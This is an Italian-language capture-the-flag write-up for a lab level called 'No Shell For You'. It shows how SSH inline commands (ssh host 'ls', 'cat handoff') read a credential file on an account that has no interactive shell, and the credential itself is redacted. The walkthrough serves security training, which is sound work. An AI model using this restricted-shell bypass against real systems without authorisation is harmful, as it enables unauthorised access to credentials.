```
 ========================================================================
   B R E A C H L A B   ::   F I E L D   N O T E S
 ------------------------------------------------------------------------
   ghost track · phile 0x11 · "no shell for you"
 ========================================================================

   target ..: ghost-17  "No Shell For You"
   class ...: ssh · non-interactive command exec
   tools ...: ssh "cmd"
   author ..: noflyfre
   status ..: owned
```

[← indice](../../README.md)

> l'account è un relay senza shell: appena entri, la sessione si chiude
> in faccia. ma SSH esegue comandi one-off anche senza prompt — e tanto
> basta.

## ----[ 0x00 · intel ]----

`ghost17` è un relay automatizzato senza shell interattiva: la sessione
SSH chiude subito dopo il login. Obiettivo: recuperare la credenziale del
livello dopo sfruttando il fatto che il server SSH accetta ed esegue
comandi passati inline sulla riga di comando, anche senza dare un prompt.

## ----[ 0x01 · recon ]----

Il primo tentativo (`ssh ghost17@<host> -p 2222`) restituisce il banner e
chiude subito: nessun prompt bash persistente. Tipico di configurazioni
con `ForceCommand` o shell ristrette che processano solo il comando
inline e poi terminano.

Passando invece un comando esplicito come argomento (`ssh host "ls"`), il
server lo esegue e restituisce l'output prima di chiudere: l'esecuzione
one-shot funziona, è solo la shell interattiva a essere disabilitata.

## ----[ 0x02 · il difetto ]----

Meccanismo standard di SSH per l'esecuzione remota di comandi singoli:
`ssh utente@host "comando"`. Il client apre una sessione, esegue esatto
quel comando (bypassando la shell interattiva di login) e restituisce
stdout/stderr prima di chiudere. Indipendente dall'avere o meno una shell
assegnata: se il demone consente l'esecuzione comandi, passa. Da lì, `ls`
sulla home remota e `cat` sui file bastano a raccogliere tutto, senza mai
una shell interattiva.

## ----[ 0x03 · exploit ]----

1. Verifica che la sessione interattiva sia disabilitata:

```bash
ssh ghost17@<host> -p 2222
(ghost17@<host>) Password:

Connection to <host> closed.
```

Chiude subito dopo l'auth, nessun prompt.

2. Comando singolo inline per enumerare la home remota:

```bash
ssh ghost17@<host> -p 2222 "ls"
(ghost17@<host>) Password:
handoff
```

Un solo elemento nella home.

3. Trattarlo da directory fallisce → è un file regolare:

```bash
ssh ghost17@<host> -p 2222 "cd handoff"
(ghost17@<host>) Password:
/bin/bash: line 1: cd: handoff: Not a directory
```

4. Lettura del file con lo stesso approccio one-off:

```bash
ssh ghost17@<host> -p 2222 "cat handoff"
(ghost17@<host>) Password:
<REDACTED>
```

## ----[ 0x04 · loot ]----

`ssh host "comando"` contro un account senza shell restituisce comunque
l'output: la lettura del file nella home espone la credenziale del
livello dopo (valore fuori dal writeup). Lezione: "niente shell" non
vuol dire "niente esecuzione".

```
--[ eof ]---------------------------------------------------------------

  breachlab.org · ghost track
```
